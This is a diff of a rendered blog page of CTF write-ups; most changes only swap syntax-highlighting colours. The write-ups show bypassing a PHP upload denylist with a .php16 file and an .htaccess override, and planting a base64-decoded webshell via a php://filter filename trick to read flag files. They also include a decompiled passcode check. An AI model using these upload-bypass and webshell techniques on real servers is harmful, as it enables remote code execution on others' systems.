@@ -28,6 +28,10 @@
 
 
 
+    
+        <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    
+
 
     <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -246,31 +250,31 @@ Retrieve the flag out of the root of the filesystem /flag.txt.
 </pre>
 <p>Since we have the website’s source code, we can see that there is an upload form at <strong><strong>/save_memories.php</strong></strong></p>
 <p>We can also see which file extentions are blacklisted</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$ext_denylist <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php2&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php3&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php4&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php5&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php6&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php7&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phps&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phps&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pht&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phtm&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phtml&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pgif&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;shtml&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phar&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;inc&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;hphp&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ctp&#34;</span>,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$ext_denylist</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">array</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;php&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;php2&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;php3&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;php4&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;php5&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;php6&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;php7&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;phps&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;phps&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;pht&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;phtm&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;phtml&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;pgif&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;shtml&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;phar&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;inc&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;hphp&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;ctp&#34;</span>,
 </span></span><span style="display:flex;"><span>);
 </span></span></code></pre></div><p>The danger when using blacklists is forgetting something, and that’s what happened here: the <strong><strong><strong><strong><strong><strong>.php16</strong></strong></strong></strong></strong></strong> extention is not filtered</p>
 <p>The challenge’s description tells us that the flag is located in the root of the filesystem, so we can directly try to <strong><strong><strong>cat</strong></strong></strong> it using php</p>
 <p>First, let’s create a <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>exploit.php16</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> file, with our malicious code inside</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat ../../../../../flag.txt&#34;</span>); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>Upload it, and read it by going to <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>/exploit.php16</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php system(<span style="color:#f1fa8c">&#34;cat ../../../../../flag.txt&#34;</span>); <span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><p>Upload it, and read it by going to <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>/exploit.php16</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
 <p><img src="https://user-images.githubusercontent.com/77807503/208268408-9edb7538-8a43-4293-9b0c-158781ecb8e7.png" alt="2022-12-17-203048_930x1026_scrot"></p>
 <p>aaaaaand… it’s blank</p>
 <p>This can happen for two reasons:</p>
@@ -281,8 +285,8 @@ Retrieve the flag out of the root of the filesystem /flag.txt.
 <p>Assuming <strong><strong><strong><strong><strong><strong><strong><strong>flag.txt</strong></strong></strong></strong></strong></strong></strong></strong> exists, it is because the php engine is not enabled</p>
 <p>By looking at the request, we know it’s running Apache, so we can try to upload a <strong><strong><strong><strong><strong><strong><strong><strong><strong>.htaccess</strong></strong></strong></strong></strong></strong></strong></strong></strong> file that will enable <strong><strong><strong>php</strong></strong></strong></p>
 <p>.htaccess:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">AddType</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">-</span><span style="color:#a6e22e">php</span> <span style="color:#f92672">.</span><span style="color:#a6e22e">php16</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php_flag</span> <span style="color:#a6e22e">engine</span> <span style="color:#a6e22e">on</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>AddType application<span style="color:#ff79c6">/</span>x<span style="color:#ff79c6">-</span>httpd<span style="color:#ff79c6">-</span>php <span style="color:#ff79c6">.</span>php16
+</span></span><span style="display:flex;"><span>php_flag engine on
 </span></span></code></pre></div><p>Upload dit, and read it by going to <strong><strong><strong>/.htaccess</strong></strong></strong></p>
 <p><img src="https://user-images.githubusercontent.com/77807503/208268411-9a442e5e-2855-4e30-b312-2c42a7dbbedd.png" alt="2022-12-17-203816_929x261_scrot"></p>
 <p>We get a 403 Forbidden response, <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>which is a good sign</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>, because by default, Apache prevents users from reading files such as <strong><strong><strong><strong><strong><strong><strong><strong><strong>.htaccess</strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
@@ -296,27 +300,27 @@ Retrieve the flag out of the root of the filesystem /flag.txt.
 It's as easy as it looks, isn't it?
 </pre>
 <p>When we visit the website, we can see the following code:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;submit&#39;</span>])) {
-</span></span><span style="display:flex;"><span>    $file_name <span style="color:#f92672">=</span> <span style="color:#a6e22e">urldecode</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>]);
-</span></span><span style="display:flex;"><span>    $tmp_path <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strpos</span>($file_name, <span style="color:#e6db74">&#34;.jpg&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span>){
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Invalid file name&#34;</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
+</span></span><span style="display:flex;"><span>error_reporting(<span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (isset(<span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;submit&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$file_name </span><span style="color:#ff79c6">=</span> urldecode(<span style="color:#8be9fd;font-style:italic">$_FILES</span>[<span style="color:#f1fa8c">&#39;file&#39;</span>][<span style="color:#f1fa8c">&#39;name&#39;</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$tmp_path </span><span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$_FILES</span>[<span style="color:#f1fa8c">&#39;file&#39;</span>][<span style="color:#f1fa8c">&#39;tmp_name&#39;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span>(strpos(<span style="color:#8be9fd;font-style:italic">$file_name</span>, <span style="color:#f1fa8c">&#34;.jpg&#34;</span>) <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">false</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;Invalid file name&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">exit</span>(<span style="color:#bd93f9">1</span>);
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($tmp_path);
-</span></span><span style="display:flex;"><span>    $all_content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?php exit(0);&#39;</span><span style="color:#f92672">.</span> $content <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;?&gt;&#39;</span>;
-</span></span><span style="display:flex;"><span>    $handle <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($file_name, <span style="color:#e6db74">&#34;w&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>($handle, $all_content);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($handle);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Done.&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$content </span><span style="color:#ff79c6">=</span> file_get_contents(<span style="color:#8be9fd;font-style:italic">$tmp_path</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$all_content </span><span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&lt;?php exit(0);&#39;</span><span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$content </span><span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#39;?&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$handle </span><span style="color:#ff79c6">=</span> fopen(<span style="color:#8be9fd;font-style:italic">$file_name</span>, <span style="color:#f1fa8c">&#34;w&#34;</span>);
+</span></span><span style="display:flex;"><span>    fwrite(<span style="color:#8be9fd;font-style:italic">$handle</span>, <span style="color:#8be9fd;font-style:italic">$all_content</span>);
+</span></span><span style="display:flex;"><span>    fclose(<span style="color:#8be9fd;font-style:italic">$handle</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;Done.&#34;</span>;
 </span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span>{
+</span></span><span style="display:flex;"><span>    show_source(__FILE__);
 </span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>So we are going to have 2 things to bypass:</p>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><p>So we are going to have 2 things to bypass:</p>
 <ul>
 <li>File needs to have .jpg in its name</li>
 <li><code>&lt;?php exit(0); ?&gt;</code> will be written at the beginning of the file</li>
@@ -327,17 +331,17 @@ It's as easy as it looks, isn't it?
 <p>That will allow us to have special characters such as / in our file name</p>
 <p>To prevent the <strong><strong><strong><strong><strong><strong><strong>exit(0)</strong></strong></strong></strong></strong></strong></strong> from bothering us, we will be using the <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>php://filter/convert.base64-decode</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> wrapper, because if we try to decode <strong><!-- raw HTML omitted --></strong> from base64, it gives us this: <strong>^+t</strong>, which is exactly what we want</p>
 <p>Let’s base64 encode a php “webshell”:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8</span><span style="color:#f92672">+</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php system(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;cmd&#34;</span>]); <span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8<span style="color:#ff79c6">+</span>
 </span></span></code></pre></div><p>and paste this into a file that we’ll call</p>
 <p><code>⌨️ php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Dshell.jpg.php</code></p>
 <p>that way, when it will be passed through the <strong><strong><strong><strong><strong><strong><strong><strong><strong>urldecode</strong></strong></strong></strong></strong></strong></strong></strong></strong>() function, the filename will look like this</p>
 <p><code>⌨️ php://filter/convert.base64-decode/resource=shell.jpg.php</code></p>
 <p>He will then decode and write this to shell.jpg.php:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">0</span>); <span style="color:#a6e22e">PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8</span><span style="color:#f92672">+</span> <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>which will look like this atfer decoding</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">^+</span><span style="color:#a6e22e">t</span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>Now that we’ve got our webshell, we can get the flag from user’s home by navigating to <strong><strong><strong><strong>/shell.jpg.php?cmd=cat ../../../../home/user/flag.txt</strong></strong></strong></strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php <span style="color:#ff79c6">exit</span>(<span style="color:#bd93f9">0</span>); PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8<span style="color:#ff79c6">+</span> <span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><p>which will look like this atfer decoding</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">^+</span>t<span style="color:#ff79c6">&lt;?</span>php system(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;cmd&#34;</span>]); <span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><p>Now that we’ve got our webshell, we can get the flag from user’s home by navigating to <strong><strong><strong><strong>/shell.jpg.php?cmd=cat ../../../../home/user/flag.txt</strong></strong></strong></strong></p>
 <p><img src="https://user-images.githubusercontent.com/77807503/208268427-34eaece6-b4cb-4711-bfa4-a0c8a6f4a540.png" alt="2022-12-17-202338_930x1026_scrot"></p>
 <p>flag → <strong><strong><strong><strong><strong><strong>flag{ab5f69d6cc412345387a0ca3a4700398}</strong></strong></strong></strong></strong></strong></p>
 <h1 id="padlock">Padlock</h1>
@@ -349,70 +353,70 @@ I forgot the combination to my pad lock :(
 <p><img src="https://user-images.githubusercontent.com/77807503/208268431-b33f5b14-4617-4e3d-9fa1-e91d9cf42ad3.png" alt="2022-12-17-230325_551x808_scrot"></p>
 <p>It asks for a passcode, then probably compares it with the right passcode</p>
 <p>We’ll throw it into IDA, and press <strong><strong>F5</strong></strong> to generate a pseudocode</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__cdecl</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>argv, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>envp)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">40</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-30h] BYREF
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_lock</span>(<span style="color:#ae81ff">63LL</span>, <span style="color:#ae81ff">63LL</span>, <span style="color:#ae81ff">63LL</span>, <span style="color:#ae81ff">63LL</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Please enter the passcode: &#34;</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_fscanf</span>(_bss_start, <span style="color:#e6db74">&#34;%s&#34;</span>, s);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;The passcode you entered was: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">51LL</span>, <span style="color:#ae81ff">101LL</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">95LL</span>, <span style="color:#ae81ff">32LL</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">48LL</span>, <span style="color:#ae81ff">111LL</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">52LL</span>, <span style="color:#ae81ff">97LL</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strlen</span>(s) <span style="color:#f92672">==</span> <span style="color:#ae81ff">38</span> )
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> s[<span style="color:#bd93f9">40</span>]; <span style="color:#6272a4">// [rsp+10h] [rbp-30h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v5; <span style="color:#6272a4">// [rsp+38h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  v5 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">__readfsqword</span>(<span style="color:#bd93f9">0x28u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">print_lock</span>(<span style="color:#bd93f9">63LL</span>, <span style="color:#bd93f9">63LL</span>, <span style="color:#bd93f9">63LL</span>, <span style="color:#bd93f9">63LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;Please enter the passcode: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">__isoc99_fscanf</span>(_bss_start, <span style="color:#f1fa8c">&#34;%s&#34;</span>, s);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;The passcode you entered was: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, s);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">replace</span>(s, <span style="color:#bd93f9">51LL</span>, <span style="color:#bd93f9">101LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">replace</span>(s, <span style="color:#bd93f9">95LL</span>, <span style="color:#bd93f9">32LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">replace</span>(s, <span style="color:#bd93f9">48LL</span>, <span style="color:#bd93f9">111LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">replace</span>(s, <span style="color:#bd93f9">52LL</span>, <span style="color:#bd93f9">97LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#50fa7b">strlen</span>(s) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">38</span> )
 </span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(<span style="color:#e6db74">&#34;master locks arent vry strong are they&#34;</span>, s) )
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span><span style="color:#50fa7b">strcmp</span>(<span style="color:#f1fa8c">&#34;master locks arent vry strong are they&#34;</span>, s) )
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">101LL</span>, <span style="color:#ae81ff">51LL</span>);
-</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">32LL</span>, <span style="color:#ae81ff">95LL</span>);
-</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">111LL</span>, <span style="color:#ae81ff">48LL</span>);
-</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">97LL</span>, <span style="color:#ae81ff">52LL</span>);
-</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">unlock</span>(s);
+</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">replace</span>(s, <span style="color:#bd93f9">101LL</span>, <span style="color:#bd93f9">51LL</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">replace</span>(s, <span style="color:#bd93f9">32LL</span>, <span style="color:#bd93f9">95LL</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">replace</span>(s, <span style="color:#bd93f9">111LL</span>, <span style="color:#bd93f9">48LL</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">replace</span>(s, <span style="color:#bd93f9">97LL</span>, <span style="color:#bd93f9">52LL</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">unlock</span>(s);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span>
 </span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Not quite!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;Not quite!&#34;</span>);
 </span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
 </span></span><span style="display:flex;"><span>}
